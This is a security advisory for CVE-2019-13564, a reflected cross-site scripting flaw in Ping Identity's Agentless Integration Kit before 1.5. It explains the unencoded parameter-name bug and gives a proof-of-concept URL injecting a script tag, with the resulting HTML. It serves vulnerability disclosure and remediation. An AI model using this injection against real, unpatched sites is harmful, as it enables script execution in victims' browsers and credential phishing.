# Ping Identity Agentless Integration Kit Reflected Cross-site Scripting (XSS) #

## Vulnerability Overview ##

Ping Identity Agentless Integration Kit before 1.5 is susceptible to
Reflected Cross-site Scripting at the `/as/authorization.oauth2`
endpoint due to improper encoding of an arbitrarily submitted HTTP
GET parameter name.

* **Identifier**            : SBA-ADV-20190305-01
* **Type of Vulnerability** : Cross-site Scripting
* **Software/Product Name** : [Ping Identity Agentless Integration Kit](https://www.pingidentity.com/developer/en/resources/agentless-integration-kit-developers-guide.html)
* **Vendor**                : [Ping Identity](https://www.pingidentity.com/)
* **Affected Versions**     : < 1.5
* **Fixed in Version**      : 1.5
* **CVE ID**                : CVE-2019-13564
* **CVSSv3 Vector**         : AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
* **CVSSv3 Base Score**     : 6.1 (Medium)

## Vendor Description ##

> After authenticating the user (via a federated security token or
> authentication adapter), the user will be presented to the protected
> application via an SP adapter. This adapter provides the last-mile
> connection between the federation server (PingFederate) and the
> application, the user will be presented to the application which can
> then create a session and render the application for the
> authenticated user.

Source: <https://www.pingidentity.com/developer/en/resources/agentless-integration-kit-developers-guide/last-mile-integration.html>

## Impact ##

By exploiting the documented vulnerability, an attacker can execute
JavaScript code in a victim's browser within the origin of the target
site. This can be misused, for example, for phishing attacks by
displaying a fake login form in the context of the trusted site via
JavaScript and then sending the victim's credentials to the attacker.

## Vulnerability Description ##

The `/as/authorization.oauth2` endpoint of PingFederate takes several
HTTP GET parameter name-value pairs, which are subsequently rendered
as an HTML form with hidden input fields.

```text
https://idp.example.com/as/authorization.oauth2?response_type=code&client_id=CLIENT&redirect_uri=https%3A%2F%2Fapp.example.com%2Fcb
```

The name of the HTTP parameter is rendered as the `name` attribute of
the corresponding input field, and the HTTP parameter value is rendered
as the `value` attribute. The content of the `value` attribute is HTML-
encoded and therefore not susceptible to XSS. However, the content of
the `name` attribute is written to the HTML document without any
encoding or sanitization.

## Proof of Concept ##

An attacker can exploit this vulnerability by ending the HTML attribute
and element and then inserting, for example, a `script` tag.

```text
https://idp.example.com/as/authorization.oauth2?response_type=code&client_id=CLIENT&redirect_uri=https%3A%2F%2Fapp.example.com%2Fcb&%22%3E%3Cscript%3Ealert(1)%3C%2fscript%3E
```

The last parameter reads as follows when URL-decoded:

```html
"><script>alert(1)</script>
```

This leads to the following HTML response (shortened for readability):

```html
<form method="post" action="[...]">
    <input type="hidden" name="REF" value="[...]"/>
    <!-- ... -->
    <input type="hidden" name=""><script>alert(1)</script>" value=""/>
    <!-- ... -->
</form>
```

## Recommended Countermeasures ##

We recommend to HTML-encode the parameter name the same way the
parameter value is encoded.

## Timeline ##

* `2019-03-05` Identified the vulnerability in version < 1.5
* `2019-03-25` Contacted the vendor via support
* `2019-05-24` Finding review with Ping Identity and SBA Research
* `2019-07-11` Publication of CVE-2019-13564

## References ##

* [NIST NVD entry of CVE-2019-13564](https://nvd.nist.gov/vuln/detail/CVE-2019-13564)

## Credits ##

* Thomas Konrad ([SBA Research](https://www.sba-research.org/))
